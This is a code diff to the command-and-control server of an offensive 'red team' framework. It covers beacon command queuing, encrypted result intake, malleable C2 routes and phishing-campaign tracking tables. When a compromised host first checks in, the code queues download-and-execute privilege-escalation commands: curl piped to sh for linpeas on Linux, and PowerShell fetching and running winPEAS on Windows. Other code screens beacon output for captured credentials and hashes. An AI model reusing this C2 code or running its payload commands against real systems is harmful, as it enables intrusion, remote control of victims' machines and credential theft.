+        SESSIONS_DIR = os.path.join(os.getcwd(), _active_tenant_sessions)
+        os.makedirs(SESSIONS_DIR, exist_ok=True)
+        app.config["SESSIONS_DIR"] = os.path.realpath(SESSIONS_DIR)
 GROQ_API_KEY = config.api_key
-ALLOWED_EXTENSIONS = {'txt', 'enc', 'exe'}
+ALLOWED_EXTENSIONS = {"txt", "enc", "exe", "sh"}
+IMPLANT_STAGE_FILES = {"stub", "stub.exe", "r", "beacon.enc"}
+app.config["ALLOWED_EXTENSIONS"] = ALLOWED_EXTENSIONS
 BINARY_HEADERS = [
-    b'\x7fELF',
-    b'MZ',
+    b"\x7fELF",
+    b"MZ",
 ]
 
 
@@ -2121,10 +3009,10 @@ os.makedirs(CAMPAIGNS_DIR, exist_ok=True)
 os.makedirs(TEMPLATES_DIR, exist_ok=True)
 conn = sqlite3.connect(DB_PATH)
 
-conn.execute('''CREATE TABLE IF NOT EXISTS tracking
-                (campaign_id TEXT, email TEXT, event TEXT, ip TEXT, timestamp TEXT)''')
+conn.execute("""CREATE TABLE IF NOT EXISTS tracking
+                (campaign_id TEXT, email TEXT, event TEXT, ip TEXT, timestamp TEXT)""")
 conn.commit()
-conn.execute('''CREATE TABLE IF NOT EXISTS behavioral_tracking (
+conn.execute("""CREATE TABLE IF NOT EXISTS behavioral_tracking (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     campaign_id TEXT,
     short_url TEXT,
@@ -2134,28 +3022,26 @@ conn.execute('''CREATE TABLE IF NOT EXISTS behavioral_tracking (
     user_agent TEXT,
     timestamp TEXT,
     behavior_data TEXT
-)''')
+)""")
 conn.commit()
-conn.execute('''CREATE TABLE IF NOT EXISTS multivector_tracking (
+conn.execute("""CREATE TABLE IF NOT EXISTS multivector_tracking (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     campaign_id TEXT,
     email TEXT,
     event_type TEXT,
     ip TEXT,
     timestamp TEXT
-)''')
+)""")
 conn.commit()
 conn.close()
 
 AES_KEY_SIZE_BYTES = _AES_KEY_SIZE_BYTES
-_AES_KEY_PATH = Path(path) / 'sessions' / 'key.aes'
+_AES_KEY_PATH = Path(path) / "sessions" / "key.aes"
 ensure_sessions_dir()
 try:
     AES_KEY = _AESKeyManager(_AES_KEY_PATH).get_or_generate()
 except ValueError:
-    logger.warning(
-        f"Existing AES key at {_AES_KEY_PATH} has an invalid length; regenerating."
-    )
+    logger.warning(f"Existing AES key at {_AES_KEY_PATH} has an invalid length; regenerating.")
     _AES_KEY_PATH.unlink(missing_ok=True)
     AES_KEY = _AESKeyManager(_AES_KEY_PATH).get_or_generate()
 
@@ -2164,9 +3050,9 @@ if not os.path.exists(UPLOAD_FOLDER):
 
 api_key = config.api_key
 
-route_maleable = config.c2_maleable_route
-win_useragent_maleable = config.user_agent_win
-lin_useragent_maleable = config.user_agent_lin
+route_malleable = config.c2_malleable_route
+win_useragent_malleable = config.user_agent_win
+lin_useragent_malleable = config.user_agent_lin
 rhost = config.rhost
 lhost = config.lhost
 
@@ -2175,115 +3061,191 @@ reverse_shell_port = config.reverse_shell_port
 DIRECTORY_TO_WATCH = f"{BASE_DIR}"
 
 
-def _safe_groq_client(key):
-    """Instantiate a Groq client without aborting on a missing API key.
+client = safe_groq_client(api_key)
+env = Environment(loader=FileSystemLoader("templates"))
+env.filters["markdown"] = markdown_to_html
 
-    A missing or invalid ``api_key`` must never crash C2 startup or a request;
-    AI-backed endpoints degrade to a clear, logged error instead.
-
-    Args:
-        key: Groq API key from ``payload.json`` (``api_key``). May be empty.
-
-    Returns:
-        A ``Groq`` client instance, or ``None`` when no usable key is
-        configured or the SDK rejects the key.
-    """
-    if not key:
-        logger.warning("Groq api_key not configured; AI-backed C2 features are disabled")
-        return None
-    try:
-        return Groq(api_key=key)
-    except Exception as exc:
-        logger.warning("Groq client initialization failed (%s); AI features disabled", exc)
-        return None
-
-
-client = _safe_groq_client(api_key)
-env = Environment(loader=FileSystemLoader('templates'))
-env.filters['markdown'] = markdown_to_html
-
-if config.enable_c2_debug == True:
-    logger.info(f"[DEBUG] Clave AES (hex): {AES_KEY.hex()}")
+if config.enable_c2_debug:
+    logger.info("[DEBUG] C2 debug mode enabled")
 
 implants_check()
 create_report()
 local_ips = get_local_ip_addresses()
 
-if len(sys.argv) > 3:
-
+if _RUN_MAIN and len(sys.argv) > 3:
     lport = sys.argv[1]
-    USERNAME = sys.argv[2]
-    PASSWORD = sys.argv[3]
+    USERNAME = sys.argv[2].strip()
+    PASSWORD = sys.argv[3].strip()
 
-    if config.enable_c2_debug == True:
+    if is_insecure_credential(USERNAME, PASSWORD):
+        print(f"[{datetime.now()}] [!] SECURITY WARNING: Insecure or default credentials detected!")
+
+        # Generate strong credentials automatically
+        alphabet = string.ascii_letters + string.digits + "!@#$%^&*()-_+="
+        strong_user = "operator_" + "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))
+        strong_pass = "".join(secrets.choice(alphabet) for _ in range(20))
+
+        print("[+] Generated strong credentials automatically:")
+        print(f"    Username: {strong_user}")
+        print(f"    Password: {strong_pass}")
+        print("[!] Please save these credentials securely!")
+
+        # Save to file for operator
+        try:
+            with open(".c2_credentials.txt", "w") as f:
+                f.write(f"# LazyOwn C2 Credentials - Generated {datetime.now()}\n")
+                f.write(f"USERNAME={strong_user}\n")
+                f.write(f"PASSWORD={strong_pass}\n")
+            os.chmod(".c2_credentials.txt", 0o600)
+            print("[+] Credentials saved to .c2_credentials.txt")
+        except Exception as e:
+            print(f"[!] Could not save credentials file: {e}")
+
+        # Use the new strong credentials
+        USERNAME = strong_user
+        PASSWORD = strong_pass
+    else:
+        print(f"[+] C2 started with custom credentials (user: {USERNAME})")
+
+    if _RBAC_AVAILABLE:
+        store = get_rbac_store()
+        try:
+            existing = store.find_by_username(USERNAME)
+        except Exception as exc:
+            logger.error("[rbac] users.json is unreadable; leaving it untouched: %s", exc)
+            existing = None
+        if existing:
+            existing.password_hash = generate_password_hash(PASSWORD)
+            store.save(existing)
+            logger.info("[rbac] Updated CLI user password in RBAC store")
+        elif not Path(USER_DATA_PATH).exists():
+            store.create_user(
+                username=USERNAME,
+                password_hash=generate_password_hash(PASSWORD),
+                role=Role.ADMIN.value,
+            )
+            logger.info("[rbac] Registered CLI user in RBAC store as admin")
+            print(f"[rbac] CLI user '{USERNAME}' registered in RBAC store")
+        else:
+            print(
+                f"[rbac] Existing user store found; skipping creation of "
+                f"'{USERNAME}'. Authenticate with an existing operator."
+            )
+
+    if config.enable_c2_debug:
         logger.info(f"    [!] Launch C2 at: {local_ips}")
         logger.info(f"    [!] Launch C2 at: {lport}")
 
-else:
-    if config.enable_c2_debug == True:
+elif _RUN_MAIN:
+    if config.enable_c2_debug:
         logger.info("    [!] Need pass the port, user & pass as argument")
         print("    [!] Need pass the port, user & pass as argument")
     sys.exit(2)
 
-if not api_key:
+if _RUN_MAIN and not api_key:
     logging.error("Error: La API key no está configurada en el archivo payload.json")
     print("Error: La API key no está configurada en el archivo payload.json")
+    shell.onecmd("BlackObsidianC2")
     exit(1)
 
-if not route_maleable:
-    logging.error("Error: c2_maleable_route not found on payload.json add, Ex:\"c2_maleable_route\": \"/gmail/v1/users/\",")
-    logging.error("Error: c2_maleable_route not found on payload.json")
+if _RUN_MAIN and not route_malleable:
+    logging.error(
+        'Error: c2_malleable_route not found on payload.json add, Ex:"c2_malleable_route": "/gmail/v1/users/",'
+    )
+    logging.error("Error: c2_malleable_route not found on payload.json")
+    sys.exit(1)
+
+route_valid, route_error = _validate_route_path(route_malleable.lstrip("/"))
+if not route_valid:
+    logging.error("Error: c2_malleable_route is invalid: %s", route_error)
     sys.exit(1)
 
 if not os.path.exists(atomic_framework_path):
-    shell.onecmd('atomic_tests')
+    shell.onecmd("atomic_tests")
+
 
 class User(UserMixin):
     def __init__(self, user_data):
-        self.id = user_data['id']
-        self.username = user_data['username']
-        self.password_hash = user_data['password_hash']
-        self.elo = user_data['elo']
+        self.id = user_data["id"]
+        self.username = user_data["username"]
+        self.password_hash = user_data["password_hash"]
+        self.elo = user_data.get("elo", 0)
+        self.role = user_data.get("role", ROLE_DEFAULT if _RBAC_AVAILABLE else "operator")
+        self.mfa_enabled = user_data.get("mfa_enabled", False)
+        self.mfa_secret = user_data.get("mfa_secret", "")
+        self.recovery_codes = user_data.get("recovery_codes", [])
+        self.tenant_id = user_data.get("tenant_id", "default")
+
+
+def _get_rbac_user_obj(flask_user):
+    if not _RBAC_AVAILABLE:
+        return None
+    try:
+        store = get_rbac_store()
+        return store.find_by_id(int(flask_user.id))
+    except Exception:
+        return None
+
 
 def load_users():
+    if _RBAC_AVAILABLE:
+        store = get_rbac_store()
+        return [u.to_dict() for u in store.load_all()]
     if os.path.exists(USER_DATA_PATH):
-        with open(USER_DATA_PATH, 'r') as file:
+        with open(USER_DATA_PATH, "r") as file:
             return json.load(file)
     return []
 
+
 def save_users(users):
-    with open(USER_DATA_PATH, 'w') as file:
+    if _RBAC_AVAILABLE:
+        store = get_rbac_store()
+        for u_dict in users:
+            user = RBACUser.from_dict(u_dict)
+            store.save(user)
+        return
+    with open(USER_DATA_PATH, "w") as file:
         json.dump(users, file, indent=4)
+
 
 def load_data():
     if not os.path.isfile(DATA_FILE):
         return {}
     try:
-        with open(DATA_FILE, 'r') as f:
+        with open(DATA_FILE, "r") as f:
             raw_data = json.load(f)
 
             if isinstance(raw_data.get("hosts"), list):
                 raw_data["hosts"] = [h["ip"] if isinstance(h, dict) else str(h) for h in raw_data["hosts"]]
 
             return raw_data
-    except (json.JSONDecodeError, IOError) as e:
+    except (json.JSONDecodeError, IOError):
         app.logger.error(f"Error cargando {DATA_FILE}:")
         return {}
 
+
 @login_manager.user_loader
 def load_user(user_id):
+    if _RBAC_AVAILABLE:
+        store = get_rbac_store()
+        rbac_user = store.find_by_id(int(user_id))
+        if rbac_user:
+            return User(rbac_user.to_dict())
+        return None
     users = load_users()
     for user_data in users:
-        if user_data['id'] == int(user_id):
+        if user_data["id"] == int(user_id):
             return User(user_data)
     return None
 
-@app.template_filter('tojson')
+
+@app.template_filter("tojson")
 def tojson_filter(value, **kwargs):
     """Custom tojson filter to handle non-serializable objects."""
     return json.dumps(make_serializable(value), **kwargs)
 
-@app.route('/', methods=['GET', 'POST'])
+
+@app.route("/", methods=["GET", "POST"])
 @requires_auth
 def index():
     response = decoy()
@@ -2292,63 +3254,64 @@ def index():
         return response
     else:
         if current_user.is_authenticated:
-            if config.enable_c2_debug == True:
+            if config.enable_c2_debug:
                 logger.info(f"Autenticated. Wellcome {client_ip}")
         else:
-            if config.enable_c2_debug == True:
+            if config.enable_c2_debug:
                 logger.info("Unautenticated.")
-            return redirect(url_for('login'))
+            return redirect(url_for("login"))
     path = os.getcwd()
-    user_agent = request.headers.get('User-Agent')
-    host = request.headers.get('Host')
-    if config.enable_c2_debug == True:
+    user_agent = request.headers.get("User-Agent")
+    host = request.headers.get("Host")
+    if config.enable_c2_debug:
         logger.info(user_agent)
         logger.info(host)
     prompt = getprompt()
     short_urls = load_short_urls()
-    prompt = prompt.replace('\n','<br>')
-    sessions_dir = f'{path}/sessions'
-    json_files = [f for f in os.listdir(sessions_dir) if f.endswith('.json')]
+    prompt = prompt.replace("\n", "<br>")
+    sessions_dir = f"{path}/sessions"
+    json_files = [f for f in os.listdir(sessions_dir) if f.endswith(".json")]
     implants_check()
     if not json_files:
         return "No JSON files found in the sessions directory.", 404
     tasks = load_tasks()
-    if request.method == 'POST':
-        title = request.form['title']
-        description = request.form['description']
-        operator = request.form['operator']
-        status = request.form['status']
+    if request.method == "POST":
+        title = request.form["title"]
+        description = request.form["description"]
+        operator = request.form["operator"]
+        status = request.form["status"]
         valid_statuses = ["New", "Refined", "Started", "Review", "Qa", "Done", "Blocked"]
 
         if status not in valid_statuses:
             return "Invalid status selected!", 400
 
         new_task = {
-            'id': len(tasks),
-            'title': title,
-            'description': description,
-            'operator': operator,
-            'status': status
+            "id": len(tasks),
+            "title": title,
+            "description": description,
+            "operator": operator,
+            "status": status,
         }
         tasks.append(new_task)
         save_tasks(tasks)
-        flash('Task created successfully!', 'success')
-        return redirect(url_for('index'))
+        flash("Task created successfully!", "success")
+        return redirect(url_for("index"))
 
     latest_json_file = max(json_files, key=lambda x: os.path.getctime(os.path.join(sessions_dir, x)))
     json_path = os.path.join(sessions_dir, latest_json_file)
 
-    with open(json_path, 'r') as f:
+    with open(json_path, "r") as f:
         session_data = json.load(f)
-
 
     if isinstance(session_data, list):
         session_data = session_data[0] if session_data else {}
 
-    session_data['params'] = make_serializable(session_data.get('params', {}))
-    session_data['params']['api_key'] = 'Hidden conntent'
+    session_data["params"] = make_serializable(session_data.get("params", {}))
+    session_data["params"]["api_key"] = "Hidden conntent"
     connected_clients_list = list(connected_clients)
-    directories = [d for d in os.listdir(atomic_framework_path) if os.path.isdir(os.path.join(atomic_framework_path, d))]
+    directories = [
+        d for d in os.listdir(atomic_framework_path) if os.path.isdir(os.path.join(atomic_framework_path, d))
+    ]
 
     commands_history = {}
     os_data = {}
@@ -2363,39 +3326,39 @@ def index():
         csv_file = f"sessions/{client_id}.log"
         try:
             if os.path.isfile(csv_file):
-                with open(csv_file, 'r') as f:
+                with open(csv_file, "r") as f:
                     reader = csv.DictReader(f)
                     rows = list(reader)
                     if rows:
                         commands_history[client_id] = [rows[-1]]
-                        os_data[client_id] = rows[-1]['os']
-                        pid[client_id] = rows[-1]['pid']
-                        hostname[client_id] = rows[-1]['hostname']
-                        ips[client_id] = rows[-1]['ips']
-                        user[client_id] = rows[-1]['user']
-                        discovered_ips[client_id] = rows[-1]['discovered_ips']
-                        result_portscan[client_id] = rows[-1]['result_portscan']
-                        result_pwd[client_id] = rows[-1]['result_pwd']
-        except Exception as e:
-            if config.enable_c2_debug == True:
+                        os_data[client_id] = rows[-1]["os"]
+                        pid[client_id] = rows[-1]["pid"]
+                        hostname[client_id] = rows[-1]["hostname"]
+                        ips[client_id] = rows[-1]["ips"]
+                        user[client_id] = rows[-1]["user"]
+                        discovered_ips[client_id] = rows[-1]["discovered_ips"]
+                        result_portscan[client_id] = rows[-1]["result_portscan"]
+                        result_pwd[client_id] = rows[-1]["result_pwd"]
+        except Exception:
+            if config.enable_c2_debug:
                 logger.info("[Error] implant logs corrupted.")
 
     event_config = load_event_config()
     response_bot = "<p><h3>LazyOwn RedTeam Framework</h3> The <b>First GPL Ai Powered C&C</b> of the <b>World</b></p>"
     tools = []
     for filename in os.listdir(TOOLS_DIR):
-        if filename.endswith('.tool'):
+        if filename.endswith(".tool"):
             tool_path = os.path.join(TOOLS_DIR, filename)
-            with open(tool_path, 'r') as file:
+            with open(tool_path, "r") as file:
                 tool_data = json.load(file)
-                tool_data['filename'] = filename
+                tool_data["filename"] = filename
                 tools.append(tool_data)
 
     karma_name = get_karma_name(current_user.elo)
     connected_hosts = get_discovered_hosts()
 
     return render_template(
-        'index.html',
+        "index.html",
         connected_clients=connected_clients_list,
         connected_hosts=connected_hosts,
         results=results,
@@ -2408,9 +3371,9 @@ def index():
         user=user,
         username=USERNAME,
         password=PASSWORD,
-        c2_route=route_maleable,
-        win_useragent=win_useragent_maleable,
-        lin_useragent=lin_useragent_maleable,
+        c2_route=route_malleable,
+        win_useragent=win_useragent_malleable,
+        lin_useragent=lin_useragent_malleable,
         implants=implants,
         directories=directories,
         tasks=tasks,
@@ -2420,71 +3383,259 @@ def index():
         tools=tools,
         current_user=current_user,
         karma_name=karma_name,
-        current_user_id = current_user.id,
+        current_user_id=current_user.id,
         elo=current_user.elo,
-        prompt = prompt,
-        local_ips= local_ips,
+        prompt=prompt,
+        local_ips=local_ips,
         discovered_ips=discovered_ips,
         result_portscan=result_portscan,
         result_pwd=result_pwd,
         short_urls=short_urls,
-        c2_port=lport
+        c2_port=lport,
     )
 
-@app.route('/command/<client_id>', methods=['GET'])
-@app.route(f'{route_maleable}<client_id>', methods=['GET'])
+
+@app.route("/command/<client_id>", methods=["GET"])
+@app.route(f"{route_malleable}<client_id>", methods=["GET"])
+@limiter.exempt
 def send_command(client_id):
+    _signature_error = _beacon_signature_guard()
+    if _signature_error is not None:
+        return _signature_error
+    _was_new_for_kc = client_id not in connected_clients
     connected_clients.add(client_id)
+
+    if _was_new_for_kc:
+        try:
+            _kc_records = _read_beacon_records(client_id)
+            _platform = "linux"
+            _primary_ip = ""
+            if _kc_records:
+                _last = _kc_records[-1]
+                _platform = str(_last.get("client", "linux")).lower()
+                if "win" in _platform or "windows" in _platform:
+                    _platform = "windows"
+                else:
+                    _platform = "linux"
+                _raw_ips = str(_last.get("ips", ""))
+                _primary_ip = _raw_ips.split(",")[0].strip().strip("[]'\"") if _raw_ips else ""
+            if not _primary_ip:
+                _primary_ip = str(client_id)
+            from modules.world_model import HostState as _HS
+            from modules.world_model import get_world_model as _get_wm
+
+            _wm = _get_wm()
+            _wm.advance_host(_primary_ip, _HS.EXPLOITED)
+            _wm.add_note(_primary_ip, f"Foothold via beacon {client_id}")
+            from modules.killchain import KillChain as _KC
+
+            _KC.advance_phase("exploit", host=_primary_ip)
+            _KC.advance_phase("privesc", host=_primary_ip)
+            logging.info("[killchain] Phase advanced to privesc via beacon GET %s", client_id)
+            if bool(getattr(config, "auto_privesc_on_checkin", False)):
+                _privesc_cmd = _build_privesc_command(_platform)
+                if _privesc_cmd:
+                    _queue_path = _secure_command_queue_path(client_id)
+                    _cmds = []
+                    if os.path.isfile(_queue_path):
+                        with open(_queue_path) as _qf:
+                            _cmds = json.load(_qf)
+                    if _privesc_cmd not in _cmds:
+                        _cmds.append(_privesc_cmd)
+                        with open(_queue_path, "w") as _qf:
+                            json.dump(_cmds, _qf)
+                        logging.info(
+                            "[privesc] Queued %s for %s on first GET",
+                            "linpeas" if _platform == "linux" else "winpeas",
+                            client_id,
+                        )
+        except Exception as _kc_exc:
+            logging.debug("[killchain] GET advance failed: %s", _kc_exc)
+
     if client_id in commands:
         command = commands.pop(client_id)
         encrypted_command = encrypt_data(command.encode())
         return Response(encrypted_command)
     else:
-        logging.info(f"No command for client {client_id}")
-        encrypted_response = encrypt_data(b'')
-        return Response(encrypted_response, mimetype='application/octet-stream')
+        try:
+            cmd_queue_file_real = _secure_command_queue_path(client_id)
+        except ValueError:
+            logging.info("Rejected invalid client_id in send_command")
+            encrypted_response = encrypt_data(b"")
+            return Response(encrypted_response, mimetype="application/octet-stream")
 
-@app.route('/command/<client_id>', methods=['POST'])
-@app.route(f'{route_maleable}<client_id>', methods=['POST'])
+        if os.path.isfile(cmd_queue_file_real):
+            try:
+                with open(cmd_queue_file_real, "r") as f:
+                    cmds = json.load(f)
+                if cmds:
+                    command = cmds.pop(0)
+                    with open(cmd_queue_file_real, "w") as f:
+                        json.dump(cmds, f)
+                    encrypted_command = encrypt_data(command.encode())
+                    return Response(encrypted_command)
+            except (OSError, ValueError, json.JSONDecodeError):
+                pass
+        logging.info(f"No command for client {client_id}")
+        encrypted_response = encrypt_data(b"")
+        return Response(encrypted_response, mimetype="application/octet-stream")
+
+
+LINPEAS_CANDIDATES = (
+    "/usr/share/peass/linpeas/linpeas.sh",
+    "external/.exploit/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh",
+    "external/linpeas.sh",
+)
+WINPEAS_CANDIDATES = (
+    "/usr/share/peass/winpeas/winPEASx64.exe",
+    "/usr/share/peass/winpeas/winPEASx86.exe",
+    "/usr/share/peass/winpeas/winPEASany.exe",
+    "external/.exploit/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASx64.exe",
+    "external/winPEASx64.exe",
+)
+
+
+def _try_copy_privesc_tool(platform: str) -> str | None:
+    """Copy linpeas/winpeas to sessions/ from known local paths.
+
+    Returns the destination filename when successful, None otherwise.
+    """
+    _candidates = LINPEAS_CANDIDATES if platform == "linux" else WINPEAS_CANDIDATES
+    for _src in _candidates:
+        if os.path.isfile(_src):
+            _dest = os.path.join(SESSIONS_DIR, os.path.basename(_src))
+            if not os.path.exists(_dest):
+                try:
+                    import shutil
+
+                    shutil.copy2(_src, _dest)
+                except OSError:
+                    continue
+            return os.path.basename(_src)
+    return None
+
+
+def _build_privesc_command(platform: str) -> str | None:
+    """Build the download+execute command for linpeas (Linux) or winpeas (Windows).
+
+    Tries to copy the tool locally first, then constructs a command that
+    downloads from the C2 server with a public GitHub fallback.
+    """
+    _lhost = str(getattr(config, "lhost", "127.0.0.1"))
+    _c2_port = str(getattr(config, "c2_port", "443"))
+    _base = f"https://{_lhost}:{_c2_port}"
+
+    if platform == "linux":
+        _try_copy_privesc_tool("linux")
+        return (
+            f"(curl -sk {_base}/s/linpeas.sh 2>/dev/null || "
+            f"curl -sSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh 2>/dev/null) "
+            f"| sh 2>&1"
+        )
+
+    if platform == "windows":
+        _fname = _try_copy_privesc_tool("windows") or "winPEASx64.exe"
+        return (
+            f"$wp=Join-Path $env:TEMP '{_fname}'; "
+            f"try{{iwr -Uri '{_base}/s/{_fname}' -OutFile $wp 2>$null}}catch{{}}; "
+            f"if(Test-Path $wp){{& $wp 2>&1}}"
+        )
+
+    return None
+
+
+def _beacon_signature_guard() -> tuple[Response, int] | None:
+    """Validate the beacon HMAC signature on beacon-channel requests.
+
+    Compares the ``X-Signature`` header (HMAC-SHA256 over the raw wire
+    body, derived from ``rat_key``) against the expected digest for both
+    beacon polling GETs and result POSTs.
+
+    The expected key is re-read from ``payload.json`` on every request:
+    key rotation can happen out of process (``clean``, the shell) while
+    the C2 keeps running, and a stale in-memory copy would reject every
+    fresh agent forever.
+
+    Returns:
+        ``None`` when the request may proceed, otherwise the
+        ``(response, status)`` tuple Flask should return directly.
+    """
+    _rat_key = ""
+    try:
+        from core.config import load_payload
+
+        _rat_key = str(load_payload().get("rat_key") or "")
+    except Exception:
+        pass
+    if not _rat_key:
+        _rat_key = str(getattr(config, "rat_key", "") or "")
+    _sig_header = request.headers.get("X-Signature", "")
+    _body = request.get_data()
+    if _sig_header and _rat_key:
+        _expected = hmac.new(_rat_key.encode(), _body, hashlib.sha256).hexdigest()
+        if not hmac.compare_digest(_sig_header, _expected):
+            return jsonify({"status": "error", "message": "Invalid signature"}), 403
+    if not bool(getattr(config, "c2_require_beacon_hmac", True)):
+        return None
+    if not _rat_key:
+        from core.session_secrets import rotate_session_secrets
+
+        _rat_key = rotate_session_secrets(config)["rat_key"]
+    if not _rat_key:
+        return jsonify(
+            {
+                "status": "error",
+                "message": "Beacon HMAC enforcement is enabled but rat_key is not configured",
+            }
+        ), 500
+    if not _sig_header:
+        return jsonify({"status": "error", "message": "Missing signature"}), 401
+    return None
+
+
+@app.route("/command/<client_id>", methods=["POST"])
+@app.route(f"{route_malleable}<client_id>", methods=["POST"])
+@limiter.exempt
 def receive_result(client_id):
-    # HMAC validation (optional — validates if X-Signature header is present)
-    _sig_header = request.headers.get('X-Signature', '')
-    if _sig_header:
-        import hmac as _hmac_mod, hashlib as _hashlib_mod
-        _rat_key = getattr(config, 'rat_key', '') or ''
-        if _rat_key:
-            _body = request.get_data()
-            _expected = _hmac_mod.new(_rat_key.encode(), _body, _hashlib_mod.sha256).hexdigest()
-            if not _hmac_mod.compare_digest(_sig_header, _expected):
-                return jsonify({"status": "error", "message": "Invalid signature"}), 403
+    _signature_error = _beacon_signature_guard()
+    if _signature_error is not None:
+        return _signature_error
     try:
         logging.info(f"Receiving result from client {client_id}")
         encrypted_data = request.get_data()
-        try:
-            decrypted_data = decrypt_data(encrypted_data)
-            client_id = decrypted_data.decode().strip()
-        except:
-            pass
         decrypted_data = decrypt_data(encrypted_data)
         data = json.loads(decrypted_data)
         if client_id not in connected_clients:
             connected_clients.add(client_id)
-            if config.enable_c2_debug == True:
+            if config.enable_c2_debug:
                 logger.info(f"New client connected: {client_id}")
-        if not data or not all(key in data for key in ['output', 'command', 'client', 'pid', 'hostname', 'ips', 'user', 'discovered_ips', 'result_portscan', 'result_pwd']):
+        if not data or not all(
+            key in data
+            for key in [
+                "output",
+                "command",
+                "client",
+                "pid",
+                "hostname",
+                "ips",
+                "user",
+                "discovered_ips",
+                "result_portscan",
+                "result_pwd",
+            ]
+        ):
             return jsonify({"status": "error", "message": "Invalid data format"}), 400
 
-        output = data['output']
-        client = data['client']
-        pid = data['pid']
-        hostname = data['hostname']
-        ips = data['ips']
-        user = data['user']
-        discovered_ips = data['discovered_ips']
-        result_portscan = data['result_portscan']
-        result_pwd = data['result_pwd']
-        command = data['command']
-
+        output = data["output"]
+        client = data["client"]
+        pid = data["pid"]
+        hostname = data["hostname"]
+        ips = data["ips"]
+        user = data["user"]
+        discovered_ips = data["discovered_ips"]
+        result_portscan = data["result_portscan"]
+        result_pwd = data["result_pwd"]
+        command = data["command"]
 
         if not all([command, output, client_id]):
             return jsonify({"status": "error", "message": "Required fields cannot be empty"}), 400
@@ -2492,7 +3643,7 @@ def receive_result(client_id):
         if not isinstance(client_id, str):
             return jsonify({"status": "error", "message": "Invalid client_id type"}), 400
 
-        sanitized_client_id = ''.join(c for c in client_id if c.isalnum() or c in '-_')
+        sanitized_client_id = "".join(c for c in client_id if c.isalnum() or c in "-_")
         if not sanitized_client_id or sanitized_client_id != client_id:
             return jsonify({"status": "error", "message": "Invalid client_id format"}), 400
 
@@ -2507,17 +3658,31 @@ def receive_result(client_id):
             if not os.access(allowed_directory_abs, os.W_OK):
                 return jsonify({"status": "error", "message": "Permission denied"}), 403
 
-        except Exception as e:
-            if config.enable_c2_debug == True:
-                logger.info(f"[ERROR] Path validation error")
+        except Exception:
+            if config.enable_c2_debug:
+                logger.info("[ERROR] Path validation error")
             return jsonify({"status": "error", "message": "Path validation error"}), 500
 
         try:
             file_exists = os.path.isfile(csv_file_abs)
-            with open(csv_file_abs, 'a', newline='') as f:
+            with open(csv_file_abs, "a", newline="") as f:
                 writer = csv.writer(f)
                 if not file_exists:
-                    writer.writerow(["client_id", "os", "pid", "hostname", "ips", "user","discovered_ips", "result_portscan", "result_pwd", "command", "output"])
+                    writer.writerow(
+                        [
+                            "client_id",
+                            "os",
+                            "pid",
+                            "hostname",
+                            "ips",
+                            "user",
+                            "discovered_ips",
+                            "result_portscan",
+                            "result_pwd",
+                            "command",
+                            "output",
+                        ]
+                    )
 
                 safe_data = [
                     _sanitize_csv_field(sanitized_client_id),
@@ -2530,11 +3695,12 @@ def receive_result(client_id):
                     _sanitize_csv_field(result_portscan, maxlen=1000),
                     _sanitize_csv_field(result_pwd, maxlen=1000),
                     _sanitize_csv_field(command, maxlen=500),
-                    _sanitize_csv_field(output, maxlen=1000)
+                    _sanitize_csv_field(output, maxlen=1000),
                 ]
                 writer.writerow(safe_data)
 
-            results[sanitized_client_id] = {
+            _record = {
+                "client_id": sanitized_client_id,
                 "output": output,
                 "client": client,
                 "pid": pid,
@@ -2544,10 +3710,14 @@ def receive_result(client_id):
                 "discovered_ips": discovered_ips,
                 "result_portscan": result_portscan,
                 "result_pwd": result_pwd,
-                "command": command
+                "command": command,
+                "timestamp": datetime_now_iso(),
             }
+            results[sanitized_client_id] = _record
+            _append_beacon_record(_record)
 
             logging.info(f"Received output from {sanitized_client_id}: {output[:100]} Platform: {client}")
+            _was_new_beacon = sanitized_client_id not in connected_clients
             connected_clients.add(sanitized_client_id)
             logging.info(f"Client {sanitized_client_id} registered as connected")
 
@@ -2559,6 +3729,7 @@ def receive_result(client_id):
             # forwards the relevant fields.
             try:
                 import threading as _engage_thr
+
                 _modules_path = os.path.join(BASE_DIR, "modules")
 
                 def _engage_publish(
@@ -2570,9 +3741,11 @@ def receive_result(client_id):
                 ):
                     try:
                         import sys as _sys_eng
+
                         if _modules_path not in _sys_eng.path:
                             _sys_eng.path.insert(0, _modules_path)
                         from engagement_hooks import publish_shell_obtained as _push
+
                         _push(
                             client_id=_cid,
                             primary_ip=_ip,
@@ -2580,25 +3753,276 @@ def receive_result(client_id):
                             user=_user,
                             platform=_platform,
                         )
+                        try:
+                            from modules.event_bus import EventCategory, LazyEvent, get_event_bus
+
+                            get_event_bus().publish(
+                                LazyEvent(
+                                    category=EventCategory.BEACON,
+                                    event_type="beacon_registered",
+                                    source="c2",
+                                    payload={
+                                        "client_id": _cid,
+                                        "ip": _ip,
+                                        "hostname": _host,
+                                        "user": _user,
+                                        "platform": _platform,
+                                    },
+                                    target=_ip,
+                                )
+                            )
+                        except Exception:
+                            pass
                     except Exception as _exc:
                         logging.debug(f"[engagement] publish_shell_obtained failed: {_exc}")
 
                 _engage_thr.Thread(
-                    target=_engage_publish, daemon=True, name="engage-shell-hook",
+                    target=_engage_publish,
+                    daemon=True,
+                    name="engage-shell-hook",
                 ).start()
             except Exception:
                 pass  # engagement hook must never affect beacon response
 
+            # ── Conditional Hooks: fire operator-defined rules ──────────────────
+            try:
+                _was_new = _was_new_beacon
+
+                def _extract_first_ip(raw: str) -> str:
+                    """Extract the first valid IPv4 address from a comma-separated string."""
+                    import ipaddress as _ipm
+
+                    for _candidate in str(raw).split(","):
+                        _clean = _candidate.strip().strip("[]'\" ")
+                        try:
+                            _ipm.IPv4Address(_clean)
+                            return _clean
+                        except Exception:
+                            continue
+                    return ""
+
+                def _is_valid_credential(value: str) -> bool:
+                    """Check if a string looks like a captured credential."""
+                    _v = str(value).strip()
+                    if not _v:
+                        return False
+                    if len(_v) < 6:
+                        return False
+                    _has_user_pass = ":" in _v and 2 <= len(_v.split(":", 1)[0]) <= 128
+                    _has_ntlm = "$" in _v and len(_v) >= 32
+                    _has_hash = "$" in _v and "$:" in _v
+                    _is_multiline = "\n" in _v and _has_user_pass
+                    _is_path_only = _v.startswith("/") or _v.startswith("\\") or _v.startswith("C:")
+                    if _is_path_only and not _has_user_pass:
+                        return False
